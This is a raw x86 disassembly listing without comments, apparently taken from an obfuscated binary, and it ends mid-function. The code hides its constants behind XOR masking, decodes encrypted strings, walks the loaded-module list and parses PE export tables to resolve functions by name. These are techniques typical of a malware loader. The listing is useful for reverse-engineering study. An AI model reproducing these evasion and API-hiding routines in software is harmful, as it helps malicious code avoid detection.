  427480:	add    edi,ebx
  427482:	mov    WORD PTR [ebp-0x4],di
  427486:	mov    di,WORD PTR [ebp-0x4]
  42748a:	mov    bx,WORD PTR [ebp+0x8]
  42748e:	cmp    bx,di
  427491:	jne    0x42758b
  427497:	mov    edi,DWORD PTR [ebp-0x1c]
  42749a:	mov    ebx,DWORD PTR [ebp-0x10]
  42749d:	xor    edi,ecx
  42749f:	lea    edi,[edi+ebx*1+0x3272ef]
  4274a6:	mov    DWORD PTR [ebp-0x10],edi
  4274a9:	mov    edi,DWORD PTR [ebp-0x1c]
  4274ac:	mov    ebx,DWORD PTR [ebp-0x14]
  4274af:	xor    edi,ecx
  4274b1:	lea    edi,[edi+ebx*1+0x3272ef]
  4274b8:	mov    DWORD PTR [ebp-0x14],edi
  4274bb:	mov    edi,DWORD PTR [ebp-0x24]
  4274be:	mov    ebx,DWORD PTR [ebp-0x10]
  4274c1:	mov    di,WORD PTR [ebx+edi*2]
  4274c5:	mov    WORD PTR [ebp+0x8],di
  4274c9:	mov    edi,DWORD PTR [ebp-0x28]
  4274cc:	mov    ebx,DWORD PTR [ebp-0x14]
  4274cf:	mov    di,WORD PTR [ebx+edi*2]
  4274d3:	mov    WORD PTR [ebp-0x4],di
  4274d7:	mov    edi,DWORD PTR [ebp-0xc]
  4274da:	mov    bx,WORD PTR [ebp+0x8]
  4274de:	xor    edi,esi
  4274e0:	add    edi,eax
  4274e2:	cmp    bx,di
  4274e5:	jne    0x4273fb
  4274eb:	mov    eax,DWORD PTR [ebp-0x18]
  4274ee:	mov    esi,DWORD PTR [ebp-0xc]
  4274f1:	xor    eax,ecx
  4274f3:	add    eax,edx
  4274f5:	imul   eax,esi
  4274f8:	mov    DWORD PTR [ebp-0xc],eax
  4274fb:	jmp    0x42750f
  4274fd:	mov    eax,DWORD PTR [ebp-0xc]
  427500:	mov    esi,DWORD PTR [ebp-0x18]
  427503:	xor    eax,ecx
  427505:	lea    eax,[eax+esi*1+0x3272ef]
  42750c:	mov    DWORD PTR [ebp-0x18],eax
  42750f:	mov    eax,DWORD PTR [ebp-0x24]
  427512:	sub    eax,edx
  427514:	xor    eax,ecx
  427516:	mov    DWORD PTR [ebp-0x30],eax
  427519:	mov    eax,DWORD PTR [ebp-0x28]
  42751c:	sub    eax,edx
  42751e:	xor    eax,ecx
  427520:	mov    DWORD PTR [ebp-0x34],eax
  427523:	mov    eax,DWORD PTR [ebp-0x34]
  427526:	mov    esi,DWORD PTR [ebp-0x1c]
  427529:	xor    esi,ecx
  42752b:	add    esi,edx
  42752d:	xor    eax,ecx
  42752f:	add    eax,0x3272ef
  427534:	imul   esi,eax
  427537:	mov    eax,DWORD PTR [ebp-0x14]
  42753a:	movzx  eax,WORD PTR [esi+eax*1]
  42753e:	mov    esi,DWORD PTR [ebp-0x30]
  427541:	mov    edi,DWORD PTR [ebp-0x1c]
  427544:	xor    esi,ecx
  427546:	add    esi,edx
  427548:	xor    edi,ecx
  42754a:	add    edi,edx
  42754c:	imul   edi,esi
  42754f:	mov    esi,DWORD PTR [ebp-0x10]
  427552:	movzx  esi,WORD PTR [edi+esi*1]
  427556:	sub    eax,edx
  427558:	sub    esi,edx
  42755a:	xor    eax,ecx
  42755c:	xor    esi,ecx
  42755e:	cmp    esi,eax
  427560:	jne    0x42758b
  427562:	mov    eax,DWORD PTR [ebp-0x30]
  427565:	mov    esi,DWORD PTR [ebp-0x1c]
  427568:	xor    eax,ecx
  42756a:	add    eax,0x3272ef
  42756f:	xor    esi,ecx
  427571:	add    esi,edx
  427573:	imul   esi,eax
  427576:	mov    eax,DWORD PTR [ebp-0x10]
  427579:	movzx  eax,WORD PTR [esi+eax*1]
  42757d:	mov    esi,DWORD PTR [ebp-0xc]
  427580:	sub    eax,edx
  427582:	xor    eax,ecx
  427584:	cmp    eax,esi
  427586:	mov    eax,DWORD PTR [ebp-0xc]
  427589:	je     0x42758e
  42758b:	mov    eax,DWORD PTR [ebp-0x18]
  42758e:	pop    edi
  42758f:	xor    eax,ecx
  427591:	pop    esi
  427592:	add    eax,edx
  427594:	pop    ebx
  427595:	leave  
  427596:	ret    0x8
  427599:	push   ebp
  42759a:	mov    ebp,esp
  42759c:	push   ecx
  42759d:	mov    cx,WORD PTR [eax]
  4275a0:	push   esi
  4275a1:	mov    esi,0x3b59
  4275a6:	sub    cx,si
  4275a9:	mov    esi,0x8a96
  4275ae:	xor    cx,si
  4275b1:	mov    esi,0x4e31
  4275b6:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  4275bd:	mov    edx,0xf89c85b9
  4275c2:	cmp    cx,si
  4275c5:	je     0x427624
  4275c7:	push   ebx
  4275c8:	push   edi
  4275c9:	movzx  ecx,cx
  4275cc:	mov    edi,0xffcd8d11
  4275d1:	mov    esi,0x75108a8
  4275d6:	mov    ebx,0x4f95
  4275db:	cmp    cx,bx
  4275de:	jne    0x4275e3
  4275e0:	mov    DWORD PTR [ebp-0x4],edx
  4275e3:	lea    edx,[edi+0x1]
  4275e6:	xor    edx,esi
  4275e8:	mov    edi,edx
  4275ea:	xor    edi,esi
  4275ec:	mov    cx,WORD PTR [eax+edi*2+0x64e5de]
  4275f4:	mov    ebx,0x3b59
  4275f9:	sub    cx,bx
  4275fc:	mov    ebx,0x8a96
  427601:	xor    cx,bx
  427604:	mov    ebx,0x4e31
  427609:	cmp    cx,bx
  42760c:	jne    0x4275d6
  42760e:	mov    ecx,DWORD PTR [ebp-0x4]
  427611:	pop    edi
  427612:	pop    ebx
  427613:	cmp    ecx,0xf89c85b8
  427619:	je     0x427624
  42761b:	xor    ecx,esi
  42761d:	lea    eax,[eax+ecx*2+0x64e5e0]
  427624:	pop    esi
  427625:	leave  
  427626:	ret    
  427627:	push   ebp
  427628:	mov    ebp,esp
  42762a:	push   ecx
  42762b:	push   esi
  42762c:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  427633:	mov    esi,0xf89c85b9
  427638:	call   0x427599
  42763d:	mov    cl,BYTE PTR [eax]
  42763f:	inc    cl
  427641:	xor    cl,0x7b
  427644:	cmp    cl,0x7a
  427647:	je     0x4276ac
  427649:	push   ebx
  42764a:	push   edi
  42764b:	mov    edx,eax
  42764d:	mov    edi,0xffcd8d11
  427652:	mov    ecx,0x75108a8
  427657:	mov    dx,WORD PTR [edx]
  42765a:	mov    ebx,0x3b59
  42765f:	sub    dx,bx
  427662:	mov    ebx,0x8a96
  427667:	xor    dx,bx
  42766a:	mov    ebx,0x4e43
  42766f:	cmp    dx,bx
  427672:	jne    0x427677
  427674:	mov    DWORD PTR [ebp-0x4],esi
  427677:	lea    esi,[edi+0x1]
  42767a:	xor    esi,ecx
  42767c:	mov    edi,esi
  42767e:	xor    edi,ecx
  427680:	lea    edx,[eax+edi*2+0x64e5de]
  427687:	mov    bl,BYTE PTR [edx]
  427689:	inc    bl
  42768b:	xor    bl,0x7b
  42768e:	cmp    bl,0x7a
  427691:	jne    0x427657
  427693:	mov    edx,DWORD PTR [ebp-0x4]
  427696:	pop    edi
  427697:	pop    ebx
  427698:	cmp    edx,0xf89c85b8
  42769e:	je     0x4276ac
  4276a0:	xor    edx,ecx
  4276a2:	xor    ecx,ecx
  4276a4:	mov    WORD PTR [eax+edx*2+0x64e5de],cx
  4276ac:	pop    esi
  4276ad:	leave  
  4276ae:	ret    
  4276af:	push   ebp
  4276b0:	mov    ebp,esp
  4276b2:	push   ecx
  4276b3:	push   esi
  4276b4:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  4276bb:	mov    esi,0xf89c85b9
  4276c0:	call   0x427599
  4276c5:	mov    cx,WORD PTR [eax]
  4276c8:	mov    edx,0x3b59
  4276cd:	sub    cx,dx
  4276d0:	mov    edx,0x8a96
  4276d5:	xor    cx,dx
  4276d8:	mov    edx,0x4e31
  4276dd:	cmp    cx,dx
  4276e0:	je     0x427739
  4276e2:	push   ebx
  4276e3:	push   edi
  4276e4:	movzx  ecx,cx
  4276e7:	mov    edx,0xffcd8d11
  4276ec:	mov    edi,0x75108a8
  4276f1:	mov    ebx,0x4e43
  4276f6:	cmp    cx,bx
  4276f9:	jne    0x4276fe
  4276fb:	mov    DWORD PTR [ebp-0x4],esi
  4276fe:	lea    esi,[edx+0x1]
  427701:	xor    esi,edi
  427703:	mov    edx,esi
  427705:	xor    edx,edi
  427707:	mov    cx,WORD PTR [eax+edx*2+0x64e5de]
  42770f:	mov    ebx,0x3b59
  427714:	sub    cx,bx
  427717:	mov    ebx,0x8a96
  42771c:	xor    cx,bx
  42771f:	mov    ebx,0x4e31
  427724:	cmp    cx,bx
  427727:	jne    0x4276f1
  427729:	cmp    DWORD PTR [ebp-0x4],0xf89c85b8
  427730:	pop    edi
  427731:	pop    ebx
  427732:	je     0x427739
  427734:	xor    eax,eax
  427736:	inc    eax
  427737:	jmp    0x42773b
  427739:	xor    eax,eax
  42773b:	pop    esi
  42773c:	leave  
  42773d:	ret    
  42773e:	push   ebp
  42773f:	mov    ebp,esp
  427741:	push   ecx
  427742:	mov    eax,DWORD PTR [ebp+0x8]
  427745:	movzx  ecx,WORD PTR [eax]
  427748:	push   esi
  427749:	lea    eax,[ecx-0x3b59]
  42774f:	mov    esi,0x8a96
  427754:	push   edi
  427755:	xor    eax,esi
  427757:	mov    edi,0x4e31
  42775c:	mov    DWORD PTR [ebp-0x4],edx
  42775f:	cmp    ax,di
  427762:	je     0x42778f
  427764:	mov    eax,DWORD PTR [ebp+0x8]
  427767:	sub    eax,edx
  427769:	mov    DWORD PTR [ebp+0x8],eax
  42776c:	jmp    0x427771
  42776e:	mov    eax,DWORD PTR [ebp+0x8]
  427771:	mov    WORD PTR [edx],cx
  427774:	add    edx,0x2
  427777:	movzx  edi,WORD PTR [eax+edx*1]
  42777b:	mov    ecx,edi
  42777d:	add    edi,0xffffc4a7
  427783:	xor    edi,esi
  427785:	mov    eax,0x4e31
  42778a:	cmp    di,ax
  42778d:	jne    0x42776e
  42778f:	xor    eax,eax
  427791:	pop    edi
  427792:	mov    WORD PTR [edx],ax
  427795:	mov    eax,DWORD PTR [ebp-0x4]
  427798:	pop    esi
  427799:	leave  
  42779a:	ret    0x4
  42779d:	push   ebp
  42779e:	mov    ebp,esp
  4277a0:	sub    esp,0x18
  4277a3:	mov    DWORD PTR [ebp-0x8],0xf89c85b9
  4277aa:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  4277b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4277b4:	push   esi
  4277b5:	mov    eax,0x75108a8
  4277ba:	xor    ecx,eax
  4277bc:	mov    esi,0x3272ef
  4277c1:	add    ecx,esi
  4277c3:	mov    DWORD PTR [ebp-0x4],ecx
  4277c6:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  4277cd:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4277d4:	push   edi
  4277d5:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4277dc:	jmp    0x42787d
  4277e1:	mov    ecx,DWORD PTR [ebp-0x4]
  4277e4:	mov    edx,DWORD PTR [ebp+0x10]
  4277e7:	sub    edx,ecx
  4277e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4277ec:	xor    ecx,eax
  4277ee:	add    ecx,esi
  4277f0:	cmp    edx,ecx
  4277f2:	jbe    0x42780f
  4277f4:	mov    edx,DWORD PTR [ebp-0x4]
  4277f7:	add    edx,DWORD PTR [ebp+0x8]
  4277fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4277fd:	add    ecx,DWORD PTR [ebp+0xc]
  427800:	mov    edi,DWORD PTR [ecx]
  427802:	mov    DWORD PTR [edx],edi
  427804:	mov    ecx,DWORD PTR [ecx+0x4]
  427807:	mov    DWORD PTR [edx+0x4],ecx
  42780a:	mov    ecx,DWORD PTR [ebp-0xc]
  42780d:	jmp    0x42785c
  42780f:	mov    ecx,DWORD PTR [ebp-0x4]
  427812:	mov    edx,DWORD PTR [ebp+0x10]
  427815:	sub    edx,ecx
  427817:	mov    ecx,DWORD PTR [ebp-0x10]
  42781a:	xor    ecx,eax
  42781c:	add    ecx,esi
  42781e:	cmp    edx,ecx
  427820:	mov    ecx,DWORD PTR [ebp-0x4]
  427823:	jbe    0x427837
  427825:	add    ecx,DWORD PTR [ebp+0x8]
  427828:	mov    edx,DWORD PTR [ebp-0x4]
  42782b:	add    edx,DWORD PTR [ebp+0xc]
  42782e:	mov    edx,DWORD PTR [edx]
  427830:	mov    DWORD PTR [ecx],edx
  427832:	mov    ecx,DWORD PTR [ebp-0x10]
  427835:	jmp    0x42785c
  427837:	mov    edx,DWORD PTR [ebp+0x10]
  42783a:	sub    edx,ecx
  42783c:	mov    ecx,DWORD PTR [ebp-0x14]
  42783f:	xor    ecx,eax
  427841:	add    ecx,esi
  427843:	cmp    edx,ecx
  427845:	mov    ecx,DWORD PTR [ebp-0x4]
  427848:	jbe    0x42786d
  42784a:	add    ecx,DWORD PTR [ebp+0x8]
  42784d:	mov    edx,DWORD PTR [ebp-0x4]
  427850:	add    edx,DWORD PTR [ebp+0xc]
  427853:	mov    dx,WORD PTR [edx]
  427856:	mov    WORD PTR [ecx],dx
  427859:	mov    ecx,DWORD PTR [ebp-0x14]
  42785c:	mov    edx,DWORD PTR [ebp-0x4]
  42785f:	xor    ecx,eax
  427861:	lea    ecx,[ecx+edx*1+0x3272ef]
  427868:	mov    DWORD PTR [ebp-0x4],ecx
  42786b:	jmp    0x42787d
  42786d:	add    ecx,DWORD PTR [ebp+0x8]
  427870:	mov    edx,DWORD PTR [ebp-0x4]
  427873:	add    edx,DWORD PTR [ebp+0xc]
  427876:	mov    dl,BYTE PTR [edx]
  427878:	mov    BYTE PTR [ecx],dl
  42787a:	inc    DWORD PTR [ebp-0x4]
  42787d:	mov    ecx,DWORD PTR [ebp-0x18]
  427880:	mov    edx,DWORD PTR [ebp+0x10]
  427883:	xor    ecx,eax
  427885:	add    ecx,esi
  427887:	imul   ecx,edx
  42788a:	mov    edx,DWORD PTR [ebp-0x8]
  42788d:	mov    edi,DWORD PTR [ebp-0x4]
  427890:	xor    edx,eax
  427892:	lea    edx,[edx+edi*1+0x3272ef]
  427899:	cmp    edx,ecx
  42789b:	jb     0x4277e1
  4278a1:	pop    edi
  4278a2:	pop    esi
  4278a3:	leave  
  4278a4:	ret    0xc
  4278a7:	push   ebp
  4278a8:	mov    ebp,esp
  4278aa:	sub    esp,0xc
  4278ad:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  4278b4:	push   esi
  4278b5:	mov    esi,eax
  4278b7:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  4278be:	mov    edx,DWORD PTR [ebp-0x4]
  4278c1:	mov    eax,0x75108a8
  4278c6:	xor    edx,eax
  4278c8:	mov    ecx,0x3272ef
  4278cd:	add    edx,ecx
  4278cf:	cmp    esi,edx
  4278d1:	je     0x427913
  4278d3:	push   ebx
  4278d4:	push   edi
  4278d5:	mov    edx,DWORD PTR [ebp-0x8]
  4278d8:	mov    ebx,DWORD PTR [ebp+0x8]
  4278db:	xor    edx,eax
  4278dd:	mov    edi,0xffcd8d11
  4278e2:	sub    edi,edx
  4278e4:	add    esi,edi
  4278e6:	lea    edx,[esi-0x3272ef]
  4278ec:	xor    edx,eax
  4278ee:	mov    DWORD PTR [ebp-0xc],edx
  4278f1:	mov    edx,DWORD PTR [ebp-0x4]
  4278f4:	mov    edi,DWORD PTR [ebp-0xc]
  4278f7:	xor    dl,0xa8
  4278fa:	sub    dl,0x11
  4278fd:	xor    edi,eax
  4278ff:	mov    BYTE PTR [edi+ebx*1+0x3272ef],dl
  427906:	mov    edx,DWORD PTR [ebp-0x4]
  427909:	xor    edx,eax
  42790b:	add    edx,ecx
  42790d:	cmp    esi,edx
  42790f:	jne    0x4278d5
  427911:	pop    edi
  427912:	pop    ebx
  427913:	pop    esi
  427914:	leave  
  427915:	ret    0x4
  427918:	push   ebp
  427919:	mov    ebp,esp
  42791b:	sub    esp,0x21c
  427921:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  427928:	mov    DWORD PTR [ebp-0x14],0xf89c85ba
  42792f:	mov    eax,DWORD PTR [ebp+0x10]
  427932:	mov    eax,DWORD PTR [ebp-0x4]
  427935:	mov    ecx,DWORD PTR [ebp+0x8]
  427938:	push   esi
  427939:	push   edi
  42793a:	mov    edi,0x75108a8
  42793f:	xor    eax,edi
  427941:	mov    esi,0x3272ef
  427946:	add    eax,esi
  427948:	cmp    eax,ecx
  42794a:	mov    eax,DWORD PTR [ebp-0x4]
  42794d:	jne    0x427958
  42794f:	xor    eax,edi
  427951:	add    eax,esi
  427953:	jmp    0x427a04
  427958:	mov    ecx,DWORD PTR [ebp+0xc]
  42795b:	xor    eax,edi
  42795d:	add    eax,esi
  42795f:	cmp    eax,ecx
  427961:	jne    0x427968
  427963:	mov    eax,DWORD PTR [ebp-0x4]
  427966:	jmp    0x42794f
  427968:	lea    eax,[ebp-0x21c]
  42796e:	mov    DWORD PTR [ebp-0x8],eax
  427971:	mov    eax,DWORD PTR [ebp+0xc]
  427974:	mov    DWORD PTR [ebp-0x10],eax
  427977:	mov    eax,DWORD PTR [ebp-0x4]
  42797a:	xor    eax,edi
  42797c:	add    eax,esi
  42797e:	mov    DWORD PTR [ebp+0x10],eax
  427981:	mov    eax,DWORD PTR [ebp+0xc]
  427984:	push   ebx
  427985:	call   0x4276af
  42798a:	mov    ebx,eax
  42798c:	mov    eax,DWORD PTR [ebp+0x8]
  42798f:	mov    eax,DWORD PTR [eax+0x14]
  427992:	jmp    0x4279ec
  427994:	mov    eax,DWORD PTR [ebp+0xc]
  427997:	sub    eax,0x8
  42799a:	mov    DWORD PTR [ebp-0xc],eax
  42799d:	mov    eax,DWORD PTR [ebp-0xc]
  4279a0:	mov    eax,DWORD PTR [eax+0x28]
  4279a3:	call   0x427599
  4279a8:	mov    DWORD PTR [ebp+0x10],eax
  4279ab:	push   DWORD PTR [ebp+0x10]
  4279ae:	mov    edx,DWORD PTR [ebp-0x8]
  4279b1:	call   0x42773e
  4279b6:	mov    eax,DWORD PTR [ebp-0x4]
  4279b9:	xor    eax,edi
  4279bb:	add    eax,esi
  4279bd:	cmp    eax,ebx
  4279bf:	jne    0x4279c9
  4279c1:	mov    eax,DWORD PTR [ebp-0x8]
  4279c4:	call   0x427627
  4279c9:	mov    eax,DWORD PTR [ebp-0x14]
  4279cc:	xor    eax,edi
  4279ce:	add    eax,esi
  4279d0:	push   eax
  4279d1:	push   DWORD PTR [ebp-0x10]
  4279d4:	mov    eax,DWORD PTR [ebp-0x8]
  4279d7:	call   0x427353
  4279dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4279df:	xor    ecx,edi
  4279e1:	add    ecx,esi
  4279e3:	cmp    eax,ecx
  4279e5:	je     0x427a0a
  4279e7:	mov    eax,DWORD PTR [ebp+0xc]
  4279ea:	mov    eax,DWORD PTR [eax]
  4279ec:	mov    DWORD PTR [ebp+0xc],eax
  4279ef:	mov    eax,DWORD PTR [ebp+0x8]
  4279f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4279f5:	add    eax,0x14
  4279f8:	cmp    ecx,eax
  4279fa:	jne    0x427994
  4279fc:	mov    eax,DWORD PTR [ebp-0x4]
  4279ff:	xor    eax,edi
  427a01:	add    eax,esi
  427a03:	pop    ebx
  427a04:	pop    edi
  427a05:	pop    esi
  427a06:	leave  
  427a07:	ret    0xc
  427a0a:	mov    eax,DWORD PTR [ebp-0xc]
  427a0d:	mov    eax,DWORD PTR [eax+0x18]
  427a10:	jmp    0x427a03
  427a12:	push   ebp
  427a13:	mov    ebp,esp
  427a15:	mov    eax,DWORD PTR [ebp+0xc]
  427a18:	sub    esp,0x10
  427a1b:	cmp    DWORD PTR [ebp+0x8],0x0
  427a1f:	push   ebx
  427a20:	push   esi
  427a21:	push   edi
  427a22:	je     0x427ad7
  427a28:	test   eax,eax
  427a2a:	je     0x427ad7
  427a30:	movzx  eax,WORD PTR [eax+0x20]
  427a34:	mov    ecx,eax
  427a36:	mov    DWORD PTR [ebp-0x10],eax
  427a39:	xor    edx,edx
  427a3b:	and    DWORD PTR [ebp-0x8],edx
  427a3e:	mov    eax,0x8a96
  427a43:	xor    ecx,eax
  427a45:	add    ecx,0x3b59
  427a4b:	mov    DWORD PTR [ebp-0xc],ecx
  427a4e:	and    DWORD PTR [ebp-0x4],0x0
  427a52:	xor    ecx,ecx
  427a54:	push   0x78
  427a56:	pop    edi
  427a57:	cmp    cx,WORD PTR [ebp-0xc]
  427a5b:	jae    0x427ac1
  427a5d:	lea    esi,[edx-0x3b59]
  427a63:	xor    esi,eax
  427a65:	movzx  ecx,WORD PTR [ebp-0x4]
  427a69:	mov    ebx,DWORD PTR [ebp+0xc]
  427a6c:	lea    ecx,[ebx+ecx*4]
  427a6f:	cmp    WORD PTR [ecx+0x2],si
  427a73:	jne    0x427aac
  427a75:	movzx  ecx,WORD PTR [ecx]
  427a78:	mov    edi,0x4e31
  427a7d:	cmp    cx,di
  427a80:	jne    0x427a8e
  427a82:	mov    ebx,DWORD PTR [ebp+0x8]
  427a85:	movzx  edi,dx
  427a88:	cmp    BYTE PTR [edi+ebx*1],0x0
  427a8c:	je     0x427abb
  427a8e:	mov    ebx,DWORD PTR [ebp+0x8]
  427a91:	movzx  edi,dx
  427a94:	movsx  di,BYTE PTR [edi+ebx*1]
  427a99:	mov    ebx,0x3b59
  427a9e:	sub    di,bx
  427aa1:	xor    di,ax
  427aa4:	cmp    cx,di
  427aa7:	je     0x427abb
  427aa9:	push   0x7a
  427aab:	pop    edi
  427aac:	inc    DWORD PTR [ebp-0x4]
  427aaf:	mov    cx,WORD PTR [ebp-0xc]
  427ab3:	cmp    WORD PTR [ebp-0x4],cx
  427ab7:	jb     0x427a65
  427ab9:	jmp    0x427ac1
  427abb:	inc    DWORD PTR [ebp-0x8]
  427abe:	push   0x79
  427ac0:	pop    edi
  427ac1:	mov    esi,DWORD PTR [ebp+0x8]
  427ac4:	movzx  ecx,dx
  427ac7:	cmp    BYTE PTR [ecx+esi*1],0x0
  427acb:	je     0x427ae0
  427acd:	inc    edx
  427ace:	cmp    edi,0x7a
  427ad1:	jne    0x427a4e
  427ad7:	xor    eax,eax
  427ad9:	pop    edi
  427ada:	pop    esi
  427adb:	pop    ebx
  427adc:	leave  
  427add:	ret    0x8
  427ae0:	mov    ecx,DWORD PTR [ebp-0x8]
  427ae3:	add    ecx,0xffffc4a7
  427ae9:	xor    cx,ax
  427aec:	xor    eax,eax
  427aee:	cmp    cx,WORD PTR [ebp-0x10]
  427af2:	sete   al
  427af5:	jmp    0x427ad9
  427af7:	push   ebp
  427af8:	mov    ebp,esp
  427afa:	sub    esp,0x50
  427afd:	push   edi
  427afe:	mov    edi,eax
  427b00:	mov    eax,DWORD PTR [edi+0x1a8]
  427b06:	cmp    DWORD PTR [eax],0x0
  427b09:	jne    0x427b12
  427b0b:	xor    eax,eax
  427b0d:	jmp    0x427c43
  427b12:	push   DWORD PTR [ebp+0x8]
  427b15:	push   0x2c
  427b17:	pop    eax
  427b18:	call   0x4278a7
  427b1d:	mov    edx,DWORD PTR [edi+0x1ac]
  427b23:	lea    eax,[edi+0x22]
  427b26:	mov    DWORD PTR [ebp-0x4c],eax
  427b29:	lea    eax,[edi+0x44]
  427b2c:	mov    DWORD PTR [ebp-0x48],eax
  427b2f:	lea    eax,[edi+0x66]
  427b32:	mov    DWORD PTR [ebp-0x44],eax
  427b35:	lea    eax,[edi+0x88]
  427b3b:	mov    DWORD PTR [ebp-0x40],eax
  427b3e:	lea    eax,[edi+0xaa]
  427b44:	mov    DWORD PTR [ebp-0x3c],eax
  427b47:	lea    eax,[edi+0xcc]
  427b4d:	mov    DWORD PTR [ebp-0x38],eax
  427b50:	lea    eax,[edi+0xee]
  427b56:	mov    DWORD PTR [ebp-0x34],eax
  427b59:	lea    eax,[edi+0x110]
  427b5f:	mov    DWORD PTR [ebp-0x30],eax
  427b62:	lea    eax,[edi+0x132]
  427b68:	mov    DWORD PTR [ebp-0x2c],eax
  427b6b:	lea    eax,[edi+0x154]
  427b71:	push   edi
  427b72:	mov    DWORD PTR [ebp-0x50],edi
  427b75:	mov    DWORD PTR [ebp-0x28],eax
  427b78:	call   0x427c77
  427b7d:	push   eax
  427b7e:	mov    eax,DWORD PTR [edi+0x1a8]
  427b84:	push   DWORD PTR [eax]
  427b86:	call   0x427918
  427b8b:	mov    DWORD PTR [ebp-0x10],eax
  427b8e:	test   eax,eax
  427b90:	je     0x427c43
  427b96:	mov    ecx,DWORD PTR [eax+0x3c]
  427b99:	push   ebx
  427b9a:	push   esi
  427b9b:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  427b9f:	add    esi,eax
  427ba1:	mov    edi,DWORD PTR [esi+0x24]
  427ba4:	mov    ecx,DWORD PTR [esi+0x1c]
  427ba7:	mov    edx,DWORD PTR [esi+0x20]
  427baa:	mov    ebx,DWORD PTR [esi+0x18]
  427bad:	add    edi,eax
  427baf:	mov    DWORD PTR [ebp-0x20],edi
  427bb2:	mov    edi,DWORD PTR [esi+0x14]
  427bb5:	add    ecx,eax
  427bb7:	add    edx,eax
  427bb9:	mov    DWORD PTR [ebp-0xc],ecx
  427bbc:	mov    DWORD PTR [ebp-0x1c],edx
  427bbf:	mov    DWORD PTR [ebp-0x8],edi
  427bc2:	cmp    edi,ebx
  427bc4:	ja     0x427bc9
  427bc6:	mov    DWORD PTR [ebp-0x8],ebx
  427bc9:	xor    ebx,ebx
  427bcb:	mov    DWORD PTR [ebp-0x18],ebx
  427bce:	cmp    DWORD PTR [ebp-0x8],ebx
  427bd1:	jbe    0x427c41
  427bd3:	jmp    0x427bd8
  427bd5:	mov    edx,DWORD PTR [ebp-0x1c]
  427bd8:	mov    edi,DWORD PTR [ebp-0x20]
  427bdb:	movzx  edi,WORD PTR [edi+ebx*2]
  427bdf:	cmp    ebx,DWORD PTR [esi+0x18]
  427be2:	jae    0x427c41
  427be4:	cmp    edi,DWORD PTR [esi+0x14]
  427be7:	jae    0x427c41
  427be9:	mov    ebx,DWORD PTR [edx+ebx*4]
  427bec:	mov    edx,DWORD PTR [ebp+0x8]
  427bef:	mov    edi,DWORD PTR [ecx+edi*4]
  427bf2:	mov    DWORD PTR [ebp-0x4],edx
  427bf5:	lea    edx,[ebp-0x50]
  427bf8:	add    ebx,eax
  427bfa:	add    edi,eax
  427bfc:	sub    edx,DWORD PTR [ebp+0x8]
  427bff:	mov    DWORD PTR [ebp-0x14],0xb
  427c06:	mov    DWORD PTR [ebp-0x24],edx
  427c09:	mov    edx,DWORD PTR [ebp-0x4]
  427c0c:	cmp    DWORD PTR [edx],0x0
  427c0f:	jne    0x427c2c
  427c11:	mov    eax,DWORD PTR [ebp-0x24]
  427c14:	push   DWORD PTR [eax+edx*1]
  427c17:	push   ebx
  427c18:	call   0x427a12
  427c1d:	mov    ecx,DWORD PTR [ebp-0xc]
  427c20:	test   eax,eax
  427c22:	je     0x427c29
  427c24:	mov    eax,DWORD PTR [ebp-0x4]
  427c27:	mov    DWORD PTR [eax],edi
  427c29:	mov    eax,DWORD PTR [ebp-0x10]
  427c2c:	add    DWORD PTR [ebp-0x4],0x4
  427c30:	dec    DWORD PTR [ebp-0x14]
  427c33:	jne    0x427c09
  427c35:	mov    ebx,DWORD PTR [ebp-0x18]
  427c38:	inc    ebx
  427c39:	mov    DWORD PTR [ebp-0x18],ebx
  427c3c:	cmp    ebx,DWORD PTR [ebp-0x8]
  427c3f:	jb     0x427bd5
  427c41:	pop    esi
  427c42:	pop    ebx
  427c43:	pop    edi
  427c44:	leave  
  427c45:	ret    0x4
  427c48:	push   ebp
  427c49:	mov    ebp,esp
  427c4b:	mov    eax,DWORD PTR [ebp+0x8]
  427c4e:	push   esi
  427c4f:	push   DWORD PTR [eax+0x1e0]
  427c55:	lea    esi,[eax+0x198]
  427c5b:	mov    eax,DWORD PTR [ebp+0x8]
  427c5e:	call   0x427af7
  427c63:	mov    ecx,DWORD PTR [esi]
  427c65:	mov    DWORD PTR [ecx],eax
  427c67:	mov    eax,DWORD PTR [esi]
  427c69:	xor    ecx,ecx
  427c6b:	cmp    DWORD PTR [eax],ecx
  427c6d:	pop    esi
  427c6e:	setne  cl
  427c71:	mov    eax,ecx
  427c73:	pop    ebp
  427c74:	ret    0x4
  427c77:	mov    ecx,DWORD PTR [edi+0x188]
  427c7d:	push   ebx
  427c7e:	jmp    0x427c93
  427c80:	xor    eax,0x8a96
  427c85:	add    eax,0x3b59
  427c8a:	mov    WORD PTR [ecx],ax
  427c8d:	add    ecx,0x2
  427c90:	add    edx,0x2
  427c93:	movzx  eax,WORD PTR [edx]
  427c96:	mov    ebx,0x4e31
  427c9b:	cmp    ax,bx
  427c9e:	jne    0x427c80
  427ca0:	xor    eax,eax
  427ca2:	mov    WORD PTR [ecx],ax
  427ca5:	mov    eax,DWORD PTR [edi+0x188]
  427cab:	pop    ebx
  427cac:	ret    
  427cad:	push   edi
  427cae:	mov    edi,eax
  427cb0:	mov    eax,DWORD PTR [esi+0x188]
  427cb6:	shl    edi,0x6
  427cb9:	add    eax,edi
  427cbb:	jmp    0x427cc6
  427cbd:	xor    cl,0x7b
  427cc0:	dec    cl
  427cc2:	mov    BYTE PTR [eax],cl
  427cc4:	inc    eax
  427cc5:	inc    edx
  427cc6:	mov    cl,BYTE PTR [edx]
  427cc8:	cmp    cl,0x7a
  427ccb:	jne    0x427cbd
  427ccd:	mov    BYTE PTR [eax],0x0
  427cd0:	mov    eax,DWORD PTR [esi+0x188]
  427cd6:	add    eax,edi
  427cd8:	pop    edi
  427cd9:	ret    
  427cda:	push   ebp
  427cdb:	mov    ebp,esp
  427cdd:	sub    esp,0x14
